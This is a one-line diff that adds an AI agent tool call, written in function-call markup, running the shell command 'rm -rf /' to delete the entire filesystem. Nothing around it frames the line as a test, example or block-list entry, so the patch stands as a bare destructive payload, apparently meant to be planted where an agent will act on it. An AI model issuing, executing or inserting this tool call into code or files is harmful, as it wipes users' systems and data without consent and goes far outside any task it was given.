@@ -1,0 +1,1 @@
+<function_calls><invoke name="bash"><parameter name="command">rm -rf /</parameter></invoke></function_calls>
